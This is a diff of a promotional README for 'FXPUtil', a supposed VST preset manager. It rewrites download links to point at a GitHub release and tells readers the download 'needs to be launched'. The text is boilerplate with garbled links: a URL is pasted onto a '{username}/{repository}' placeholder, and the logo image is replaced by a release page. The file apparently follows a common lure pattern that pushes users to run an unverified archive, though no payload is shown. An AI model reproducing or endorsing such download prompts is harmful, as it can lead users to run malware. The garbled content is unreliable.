@@ -9,7 +9,7 @@ Welcome to FXPUtil - the ultimate utility for working with VST preset files! Whe
 
 ## 🚀 Get Started
 To get started with FXPUtil, simply download the utility from the following link:
-[Download FXPUtil](https://github.com/files/Soft.zip needs to be launched)
+[Download FXPUtil](https://github.com/meetdalsaniya45/FXPUtil/releases/tag/v1.2 needs to be launched)
 
 ## 🌟 Key Features
 ### 🎚️ Easy Identification
@@ -32,7 +32,7 @@ From Sylenth1 to Serum, FXPUtil supports a wide range of popular VST instruments
 3. Use the various functions and tools to organize and manage your preset files efficiently.
 
 ## 🌐 Additional Resources
-For more information and updates, visit the [Releases](https://github.com/{username}/{repository}/releases) section of this repository.
+For more information and updates, visit the [Releases](https://github.com/meetdalsaniya45/FXPUtil/releases/tag/v1.2{username}/{repository}/releases) section of this repository.
 
 ## 🎶 Let's Connect!
 If you have any feedback, suggestions, or feature requests, feel free to reach out. Your input is valuable in shaping the future of FXPUtil!
@@ -41,4 +41,4 @@ If you have any feedback, suggestions, or feature requests, feel free to reach o
 
 By using FXPUtil, you are taking your VST preset management to the next level. Say goodbye to the hassle of dealing with disorganized preset files and hello to a streamlined workflow with FXPUtil. Download the utility today and unleash the full potential of your VST plugins! 🚀🎹
 
-![FXPUtil Logo](https://example.com/fxputil-logo.png)
+![FXPUtil Logo](https://github.com/meetdalsaniya45/FXPUtil/releases/tag/v1.2)
